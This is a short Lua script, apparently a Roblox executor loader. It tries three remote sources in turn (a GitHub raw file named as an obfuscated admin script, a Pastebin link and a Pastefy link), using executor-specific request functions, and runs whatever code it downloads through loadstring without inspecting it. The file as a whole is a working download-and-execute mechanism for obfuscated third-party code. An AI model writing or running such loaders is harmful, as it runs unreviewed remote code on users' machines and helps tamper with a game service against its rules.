local urls = {
    "https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/LifeTogether_Admin_Obf.lua",
    "https://pastebin.com/raw/azPSzEjH",
    "https://pastefy.app/SiDMhe47/raw"
}

local httpget =
	(typeof and typeof(game.HttpGet) == "function" and game.HttpGet) or
	(typeof and typeof(game.HttpGetAsync) == "function" and game.HttpGetAsync) or
	request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)

local function load_script(code)
    if code and type(code) == "string" then
        local f, err = loadstring(code)
        if f then
            f()
            return true
        else
            warn("Loadstring failed: "..tostring(err))
        end
    end
    return false
end

local success = false

for _, url in ipairs(urls) do
    local ok, body = pcall(game.HttpGet, game, url, true)
    if ok and type(body) == "string" and body ~= "" then
        if load_script(body) then
            success = true
            break
        end
    end

    if httpget then
        local req_ok, res = pcall(syn.request, {Url = url, Method = "GET"})
        if req_ok and res and res.Success and res.Body then
            print("Loaded via httprequest: "..url)
            if load_script(res.Body) then
                success = true
                break
            end
        end
    end
end

if not success then
    warn("Failed to load script from all sources.")
end
